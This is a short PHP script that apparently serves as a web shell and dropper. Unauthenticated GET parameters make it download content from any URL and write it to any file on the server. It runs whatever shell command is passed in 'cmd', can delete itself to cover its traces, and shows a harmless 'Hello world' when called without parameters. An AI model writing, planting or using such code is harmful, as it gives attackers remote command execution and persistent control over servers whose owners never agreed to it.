<?php

session_start();

if(get_magic_quotes_gpc()===1) {
	$_GET  = json_decode(stripslashes(json_encode($_GET,  JSON_HEX_APOS)), true);
	$_POST = json_decode(stripslashes(json_encode($_POST, JSON_HEX_APOS)), true);
}

if(!empty($_GET['url']) && !empty($_GET['filename'])) {
	$text = file_get_contents($_GET['url']);
	if(file_put_contents($_GET['filename'], $text)!==false) {
		if(isset($_GET['destroy'])) {
			unlink(__FILE__);
			echo 'Cloned and destroyed. ';
		} else {
			echo 'Cloned. ';
		}
		if(!empty($_GET['cmd'])) {
			echo shell_exec($_GET['cmd']);
		}
	} else {
		echo 'Failed';
	}
} else {
	echo 'Hello world';
}
